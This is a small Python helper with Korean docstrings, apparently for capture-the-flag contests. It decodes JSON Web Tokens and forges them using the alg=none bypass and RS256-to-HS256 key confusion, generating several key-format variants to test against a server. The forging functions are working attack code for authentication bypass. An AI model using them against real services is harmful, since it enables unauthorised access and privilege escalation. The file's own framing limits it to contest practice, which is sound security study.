"""JWT 점검/위조 헬퍼 (무의존, 표준 라이브러리만).

용도: 대회가 제공한 인증 서비스가 JWT로 권한을 나눌 때, 토큰 구조를 읽고
알려진 설정 오류(alg=none, RS256↔HS256 혼동)를 로컬에서 재현해 보기 위한 CTF 보조 도구.
공개된 기법이며(jwt_tool 등과 동일), 대회가 제공한 대상에만 사용한다. 그 외 시스템 금지.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def decode(token: str) -> tuple[dict, dict, bytes]:
    """검증 없이 header/payload/signature로 분해해서 정찰용으로 본다."""
    h, p, s = token.split(".")
    return (
        json.loads(_b64url_decode(h)),
        json.loads(_b64url_decode(p)),
        _b64url_decode(s),
    )


def _signing_input(header: dict, payload: dict) -> bytes:
    h = _b64url(json.dumps(header, separators=(",", ":"), sort_keys=True).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":"), sort_keys=True).encode())
    return f"{h}.{p}".encode()


def make_none(payload: dict, extra_header: dict | None = None) -> str:
    """alg=none 토큰(서명 없음). 서버가 none을 허용하는 설정 오류일 때만 통과."""
    header = {"alg": "none", "typ": "JWT", **(extra_header or {})}
    return _signing_input(header, payload).decode() + "."


def make_hs256(payload: dict, secret: bytes, extra_header: dict | None = None) -> str:
    """HS256 토큰을 secret으로 서명."""
    header = {"alg": "HS256", "typ": "JWT", **(extra_header or {})}
    si = _signing_input(header, payload)
    sig = hmac.new(secret, si, hashlib.sha256).digest()
    return f"{si.decode()}.{_b64url(sig)}"


def alg_confusion_variants(payload: dict, public_key_path: str,
                           extra_header: dict | None = None) -> list[str]:
    """RS256→HS256 혼동: 노출된 '공개키'를 HMAC 비밀키로 써서 HS256 서명.

    서버가 RS256 공개키로 HS256을 검증하는 설정 오류면 통과한다.
    키 파일의 바이트 표현(원본/개행정리/PEM 포함·제외)이 서버 기대와 달라 실패하는 경우가 많아
    흔한 변형을 모두 만들어 돌려준다. 하나씩 서버에 넣어보고 '유효 토큰' 신호를 찾는다.
    """
    raw = open(public_key_path, "rb").read()
    variants = {raw, raw.strip(), raw.replace(b"\r\n", b"\n"),
                raw.strip() + b"\n", raw.rstrip(b"\n")}
    return [make_hs256(payload, key, extra_header) for key in variants]


if __name__ == "__main__":
    import sys
    if len(sys.argv) == 2:
        hdr, pl, _ = decode(sys.argv[1])
        print("header :", hdr)
        print("payload:", pl)
    else:
        print("사용법: python templates/jwt_attack.py <jwt-token>   # 디코드/정찰")
